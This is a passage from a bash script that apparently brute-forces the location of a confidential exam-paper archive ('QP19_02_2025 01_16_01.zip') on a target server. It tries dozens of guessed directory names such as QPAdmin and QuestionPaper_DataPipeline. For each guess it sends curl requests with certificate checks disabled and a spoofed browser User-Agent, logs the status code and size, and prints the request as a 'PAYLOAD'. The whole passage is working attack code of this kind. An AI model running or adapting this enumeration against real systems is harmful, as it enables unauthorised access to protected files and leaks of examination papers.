${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Transfer-QPBData/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPAdmin/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPAdmin/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPAdmin/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [BatchProcessor_QPAuto/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}BatchProcessor_QPAuto/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}BatchProcessor_QPAuto/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPaper_Handler/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPaper_Handler/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPaper_Handler/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Mgmt_Q_P/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Mgmt_Q_P/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Mgmt_Q_P/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DataOps-QPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DataOps-QPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DataOps-QPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [HandlingQPControl/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}HandlingQPControl/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}HandlingQPControl/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Handling-QPaperDoc/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Handling-QPaperDoc/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Handling-QPaperDoc/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Processing-QPBFile/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Processing-QPBFile/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Processing-QPBFile/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Workflow_QuestionPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Workflow_QuestionPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Workflow_QuestionPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPAuto_HandlingModule/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPAuto_HandlingModule/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPAuto_HandlingModule/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [MassUpload_QPHandler/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}MassUpload_QPHandler/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}MassUpload_QPHandler/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Upload-QPService/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Upload-QPService/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Upload-QPService/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBFile_DataPipeline/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBFile_DataPipeline/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBFile_DataPipeline/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [TestPaper-BatchProcessor/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}TestPaper-BatchProcessor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}TestPaper-BatchProcessor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Uploader-QPBData/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Uploader-QPBData/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Uploader-QPBData/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [PanelQPAuto/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}PanelQPAuto/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}PanelQPAuto/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBulk_Automation/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBulk_Automation/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBulk_Automation/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Management_TestPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Management_TestPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Management_TestPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QuestionPaper_DataPipeline/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QuestionPaper_DataPipeline/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QuestionPaper_DataPipeline/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Admin-QP/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Admin-QP/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Admin-QP/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DataUpload-TestPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DataUpload-TestPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DataUpload-TestPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [TransferQPUploader/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}TransferQPUploader/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}TransferQPUploader/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [BatchProcessorQsnPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}BatchProcessorQsnPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}BatchProcessorQsnPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [MonitoringToolQPAdmin/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}MonitoringToolQPAdmin/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}MonitoringToolQPAdmin/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Mgmt_QPAuto/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Mgmt_QPAuto/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Mgmt_QPAuto/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Suite_QPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Suite_QPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Suite_QPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [BatchProcessor_QsnPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}BatchProcessor_QsnPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}BatchProcessor_QsnPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBFile_Service/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBFile_Service/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBFile_Service/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QuestionPaperBatchUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QuestionPaperBatchUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QuestionPaperBatchUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPWorkflow_Transfer/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPWorkflow_Transfer/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPWorkflow_Transfer/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Workflow_QP/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Workflow_QP/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Workflow_QP/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPaperDoc-AccessControl/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPaperDoc-AccessControl/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPaperDoc-AccessControl/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPService-Tool/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPService-Tool/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPService-Tool/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Automation_QPMgmt/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Automation_QPMgmt/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Automation_QPMgmt/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPControl-FileUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPControl-FileUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPControl-FileUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPSystemSync/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPSystemSync/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPSystemSync/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [AutoUpload_TestPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}AutoUpload_TestPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}AutoUpload_TestPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPMgmt-BatchUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPMgmt-BatchUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPMgmt-BatchUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ModuleQPBatch/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
